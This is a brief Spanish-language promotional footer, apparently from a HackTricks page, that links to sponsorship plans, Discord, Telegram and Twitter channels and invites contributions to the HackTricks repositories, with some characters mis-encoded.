* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos en** **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
